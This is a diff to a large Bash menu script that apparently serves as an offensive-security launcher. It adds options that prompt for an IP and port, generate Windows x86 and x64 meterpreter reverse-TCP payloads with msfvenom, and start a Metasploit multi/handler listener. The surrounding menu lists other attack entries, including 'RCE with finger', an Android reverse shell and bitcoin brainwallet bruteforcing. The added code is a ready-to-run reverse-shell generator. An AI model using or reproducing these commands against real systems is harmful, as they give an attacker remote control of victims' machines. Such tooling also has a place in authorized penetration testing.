@@ -1092,7 +1092,7 @@ while true; do
 	Stampa " 2337. install a deb package" "2338. install a browser" "2353. Pull a Docker image"
 	Stampa " 2452. AWS S3 copy file to remote host" "2453. AWS S3 list file in remote host" "2454. AWS S3 dump dynamodb tables"
 	Stampa " 2457. install poetry" "2503. run dbg and disassembling a bin file" "751. RCE with finger"
-	Stampa " 2515. Create a Reverse Shell for Android and run a listener"
+	Stampa " 2515. Create a Reverse Shell for Android and run a listener" "2539. Create a Reverse Shell for Windows x86 and run a listener" "2540. Create a Reverse Shell for Windows x64 and run a listener"
 	echo "$SEP"
 	echo "VIRTUAL COINS - CURRENCIES"
 	Stampa " 511. Isaacdelly/Plutus" "512. dan-v/bruteforce-bitcoin-brainwallet" "513. SMH17/bitcoin-hacking-tools"
@@ -10296,6 +10296,41 @@ while true; do
 	;;
 	"2538")
 		Clona "nccgroup/Solitude"
+	;;
+	"2539")
+		echo "Digit your IP"
+		read -p "(example, 192.168.0.1): " MIP
+		if [[ "$MIP" != "" ]];
+		then
+			echo "Digit your PORT"
+			read -p "(default, 9001): " -i "9001" MPRT
+			if [[ "$MIP" != "" ]];
+			then
+				select EXT in "exe" "dll"
+				do
+					msfvenom -p windows/meterpreter/reverse_tcp -ax86 -f $EXT LHOST=$MIP LPORT=$MPRT > reverse_32bit.$EXT
+					msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST ""$MIP""; set LPORT ""$MPRT""; exploit"
+					break
+				done
+			fi
+		fi
+	;;
+	"2540")
+		echo "Digit your IP"
+		read -p "(example, 192.168.0.1): " MIP
+		if [[ "$MIP" != "" ]];
+		then
+			echo "Digit your PORT"
+			read -p "(default, 9001): " -i "9001" MPRT
+			if [[ "$MIP" != "" ]];
+			then
+				select EXT in "exe" "dll"
+				do
+					msfvenom -p windows/x64/meterpreter/reverse_tcp -ax64 -f $EXT LHOST=$MIP LPORT=$MPRT > reverse_64bit.$EXT
+					msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST ""$MIP""; set LPORT ""$MPRT""; exploit"
+				done
+			fi
+		fi
 	;;
 	*)
 		echo "error, invalid choice"
